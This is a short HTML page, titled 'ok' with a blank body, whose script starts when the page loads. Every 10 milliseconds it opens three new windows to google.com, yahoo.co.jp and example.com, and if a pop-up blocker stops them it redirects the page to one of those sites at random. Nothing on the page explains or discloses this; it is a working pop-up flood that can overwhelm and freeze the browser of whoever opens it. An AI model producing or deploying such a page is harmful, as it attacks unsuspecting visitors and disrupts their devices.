<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ok</title>
    <script>
        const urls = [
            "https://example.com",
            "https://google.com",
            "https://yahoo.co.jp"
        ];

        function openSites() {
            let openedWindows = urls.map(url => window.open(url, "_blank", "width=800,height=600"));

            // ポップアップブロック確認
            setTimeout(() => {
                openedWindows.forEach((win, index) => {
                    if (!win || win.closed) {
                        location.href = urls[Math.floor(Math.random() * urls.length)];
                    }
                });
            }, 500);
        }

        setInterval(openSites, 10);
    </script>
</head>
<body>
</body>
</html>
